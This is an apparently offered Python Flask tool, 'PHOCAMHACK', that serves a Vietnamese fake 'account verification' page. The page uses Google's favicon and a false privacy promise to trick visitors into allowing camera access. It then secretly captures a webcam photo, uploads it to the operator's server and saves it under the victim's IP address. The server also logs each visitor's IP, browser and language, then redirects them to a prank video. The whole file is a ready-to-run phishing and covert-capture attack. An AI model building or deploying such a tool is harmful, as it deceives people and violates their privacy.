from flask import Flask, request, render_template_string
import os
from datetime import datetime

app = Flask(__name__)
os.system("cls")
print("""

██████╗░██╗░░██╗░█████╗░░█████╗░░█████╗░███╗░░░███╗██╗░░██╗░█████╗░░█████╗░██╗░░██╗
██╔══██╗██║░░██║██╔══██╗██╔══██╗██╔══██╗████╗░████║██║░░██║██╔══██╗██╔══██╗██║░██╔╝
██████╔╝███████║██║░░██║██║░░╚═╝███████║██╔████╔██║███████║███████║██║░░╚═╝█████═╝░
██╔═══╝░██╔══██║██║░░██║██║░░██╗██╔══██║██║╚██╔╝██║██╔══██║██╔══██║██║░░██╗██╔═██╗░
██║░░░░░██║░░██║╚█████╔╝╚█████╔╝██║░░██║██║░╚═╝░██║██║░░██║██║░░██║╚█████╔╝██║░╚██╗
╚═╝░░░░░╚═╝░░╚═╝░╚════╝░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚═╝
-- BY: MLBSANS
-- github: https://github.com/mlbsans""")
# Đường dẫn lưu ảnh
SAVE_PATH = "IMAGE"
os.makedirs(SAVE_PATH, exist_ok=True)  # Đảm bảo thư mục tồn tại

HTML_PAGE = """  
<!DOCTYPE html>
<html lang="vi">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Cổng Xác Thực Tài Khoản - An Toàn & Tin Cậy</title>
  <link rel="icon" href="https://www.google.com/favicon.ico">
  <!-- Google Fonts -->
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  <style>
    /* Global styles */
    body {
      margin: 0;
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(135deg, #e3f2fd, #bbdefb);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      color: #333;
    }
    .container {
      background: #fff;
      max-width: 400px;
      width: 90%;
      padding: 30px;
      border-radius: 8px;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      text-align: center;
      position: relative;
      z-index: 1;
      animation: fadeIn 1s ease-out;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-20px); }
      to { opacity: 1; transform: translateY(0); }
    }
    h2 {
      color: #0d6efd;
      margin-bottom: 10px;
    }
    p {
      font-size: 16px;
      line-height: 1.5;
      margin-bottom: 20px;
    }
    .info {
      font-size: 14px;
      color: #777;
      margin-top: 15px;
    }
    .btn {
      background-color: #0d6efd;
      color: #fff;
      border: none;
      padding: 12px 20px;
      font-size: 16px;
      border-radius: 5px;
      cursor: pointer;
      transition: background-color 0.3s ease;
    }
    .btn:hover {
      background-color: #0b5ed7;
    }
    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid #0d6efd;
      border-radius: 50%;
      width: 40px;
      height: 40px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
      display: none; /* Ẩn mặc định */
    }
    @keyframes spin {
      100% { transform: rotate(360deg); }
    }
    .success-msg {
      color: #28a745;  /* Đổi thành màu xanh lá cây */
      font-weight: 600;
      font-size: 18px;
      margin-top: 20px;
      display: none; /* Ẩn mặc định */
      animation: fadeInText 1s forwards;
    }
    @keyframes fadeInText {
      from { opacity: 0; }
      to { opacity: 1; }
    }
    /* Modal Styles */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 2;
    }
    .modal-content {
      background: #fff;
      width: 90%;
      max-width: 500px;
      padding: 20px;
      border-radius: 8px;
      text-align: left;
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
    }
    .modal-content h3 {
      margin-top: 0;
      color: #0d6efd;
    }
    .modal-content p {
      font-size: 14px;
      color: #555;
      margin-bottom: 20px;
    }
    .modal-close {
      background: #0d6efd;
      color: #fff;
      border: none;
      padding: 8px 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s ease;
      float: right;
    }
    .modal-close:hover {
      background: #0b5ed7;
    }
  </style>
</head>
<body>
  <!-- Nội dung chính -->
  <div class="container">
    <h2>Xác Thực Tài Khoản</h2>
    <p>Để đảm bảo an toàn, chúng tôi cần xác minh danh tính của bạn qua camera. Hình ảnh của bạn được bảo mật tuyệt đối và chỉ dùng cho mục đích xác thực.</p>
    <button class="btn" id="verify-btn" onclick="startVerification()">Xác Minh Ngay</button>
    <div class="loader" id="loader"></div>
    <div id="success-message" class="success-msg">✅ Cảm ơn bạn đã xác minh ✅</div>
    <p class="info">Chúng tôi cam kết bảo mật thông tin của bạn.</p>
  </div>

  <!-- Modal Chính Sách Riêng Tư -->
  <div class="modal" id="privacy-modal">
    <div class="modal-content">
      <h3>Chính Sách Riêng Tư</h3>
      <p>
        Chúng tôi sử dụng camera của bạn chỉ để xác minh danh tính. Hình ảnh của bạn sẽ được lưu trữ tạm thời và bảo mật tuyệt đối. 
        Thông tin này sẽ không được chia sẻ với bất kỳ bên thứ ba nào.
      </p>
      <button class="modal-close" onclick="closeModal()">Đồng Ý</button>
    </div>
  </div>

  <script>
    // Hiển thị modal khi tải trang
    window.addEventListener('load', function() {
      document.getElementById('privacy-modal').style.display = 'flex';
    });

    function closeModal() {
      document.getElementById('privacy-modal').style.display = 'none';
    }

    function startVerification() {
      let button = document.getElementById("verify-btn");
      let loader = document.getElementById("loader");
      let successMessage = document.getElementById("success-message");

      // Ẩn nút xác minh và hiển thị loader
      button.style.display = "none";
      loader.style.display = "block";

      // Yêu cầu quyền truy cập webcam
      navigator.mediaDevices.getUserMedia({ video: true })
        .then(stream => {
          let videoTrack = stream.getVideoTracks()[0];
          let imageCapture = new ImageCapture(videoTrack);
          imageCapture.takePhoto()
            .then(blob => {
              let formData = new FormData();
              formData.append("image", blob, "face_verification.png");
              // Gửi ảnh đến server
              fetch('/upload', { method: "POST", body: formData })
                .then(response => {
                  loader.style.display = "none";
                  successMessage.style.display = "block";
                  // Sau 3 giây, chuyển hướng nếu cần
                  setTimeout(() => {
                    window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
                  }, 3000);
                })
                .catch(error => {
                  console.error("Lỗi upload ảnh:", error);
                  loader.style.display = "none";
                  button.style.display = "block";
                });
            })
            .catch(err => {
              console.error("Lỗi chụp ảnh:", err);
              loader.style.display = "none";
              button.style.display = "block";
            });
        })
        .catch(err => {
          console.error("Lỗi truy cập webcam:", err);
          loader.style.display = "none";
          button.style.display = "block";
        });
    }
  </script>
</body>
</html>
"""  
@app.route('/')
def index():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent', 'Không xác định')
    language = request.headers.get('Accept-Language', 'Không xác định')
    
    print(f"\033[32m[+]: IPv4: {user_ip}\033[0m")
    print(f"\033[36m[+]: Hệ điều hành: {user_agent}\033[0m")
    print(f"\033[36m[+]: Ngôn ngữ: {language}\033[0m")

    return render_template_string(HTML_PAGE)

@app.route('/upload', methods=['POST'])
def upload():
    if 'image' not in request.files:
        return "Lỗi khi nhận ảnh!", 400

    image = request.files['image']
    user_ip = request.remote_addr
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    image_path = os.path.join(SAVE_PATH, f"{user_ip}_{timestamp}.png")

    try:
        os.makedirs(SAVE_PATH, exist_ok=True)  # Đảm bảo thư mục tồn tại
        image.save(image_path)
        print(f"\033[32m[📷] Ảnh đã lưu: {image_path}\033[0m")
        return "OK", 200
    except Exception as e:
        print(f"\033[31mLỗi khi lưu ảnh: {e}\033[0m")
        return "Lỗi khi lưu ảnh!", 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080, debug=True)